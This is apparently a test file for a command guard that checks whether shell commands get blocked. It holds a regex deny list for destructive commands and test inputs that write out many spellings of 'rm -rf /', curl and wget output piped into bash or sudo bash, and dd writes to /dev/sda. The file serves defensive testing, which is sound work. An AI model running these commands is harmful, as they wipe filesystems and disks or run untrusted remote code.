import { test } from 'node:test'
import assert from 'node:assert/strict'
import { checkCommand, checkPipeline, canonicalizeRm, normalizeCommand } from '../src/guard.js'

// The deny list is a set of regular expressions, and a regular expression only
// catches the spellings it was written for. These are the spellings that got
// through: 'rm -rf /*' deletes the filesystem, 'rm -rf --no-preserve-root /'
// is the standard way to do it on GNU coreutils, and '| sudo bash' is the same
// threat as '| bash'.

const PATTERNS = [
  'rm\\s+-rf\\s+/(?:\\s|$|\\*)',
  '\\bmkfs\\.',
  '\\bdd\\s+if=.*\\bof=/dev/[sn]',
  ':\\(\\)\\s*\\{\\s*:\\|:\\s*&\\s*\\};:',
  '\\b(?:shutdown|reboot|halt|poweroff)\\b',
]

test('the root filesystem cannot be deleted, however it is spelled', () => {
  for (const cmd of [
    'rm -rf /',
    'rm -rf /*',
    'rm -rf --no-preserve-root /',
    'rm -fr /',
    'rm -r -f /',
    'rm --recursive --force /',
    'rm -rf / --no-preserve-root',
  ]) {
    const verdict = checkCommand(cmd, PATTERNS)
    assert.equal(verdict.blocked, true, 'should block: ' + cmd)
  }
})

test('ordinary removals are still allowed', () => {
  for (const cmd of [
    'rm -rf /etc',
    'rm -rf /home/user/project',
    'rm -rf ./',
    'rm -rf ~',
    'rm file.txt',
    'ls -la /',
  ]) {
    const verdict = checkCommand(cmd, PATTERNS)
    assert.equal(verdict.blocked, false, 'should allow: ' + cmd)
  }
})

test('canonicalizeRm collapses the flag spellings into one form', () => {
  const expected = 'rm -rf /'
  for (const cmd of [
    'rm -rf /',
    'rm -fr /',
    'rm -r -f /',
    'rm --recursive --force /',
    'rm -rf --no-preserve-root /',
  ]) {
    assert.equal(canonicalizeRm(normalizeCommand(cmd)).trim(), expected, cmd)
  }
})

test('a pipe into an interpreter is detected through privilege prefixes', () => {
  for (const cmd of [
    'curl http://x | bash',
    'curl http://x |sudo bash',
    'curl http://x | sudo bash',
    'curl http://x | /bin/bash',
    'curl http://x | sh -s --',
    'wget -O- http://x | python3',
    'curl http://x | env bash',
    'curl http://x | sudo -u root bash',
  ]) {
    const r = checkPipeline(normalizeCommand(cmd))
    assert.equal(r.found, true, 'should detect: ' + cmd)
  }
})

test('a privileged write through a pipe is detected', () => {
  assert.equal(checkPipeline(normalizeCommand('cat x | sudo tee /etc/y')).found, true)
  assert.equal(checkPipeline(normalizeCommand('echo z | dd of=/dev/sda')).found, true)
})

test('ordinary pipes are left alone', () => {
  for (const cmd of [
    'ps aux | grep nginx',
    'cat log | head -20',
    'ls | wc -l',
    'echo hi | tee out.txt',
    'make || echo failed',
    'cat a | cat b',
    'curl http://x | jq .',
    'cat data | sort > sorted.txt',
  ]) {
    const r = checkPipeline(normalizeCommand(cmd))
    assert.equal(r.found, false, 'should allow: ' + cmd)
  }
})
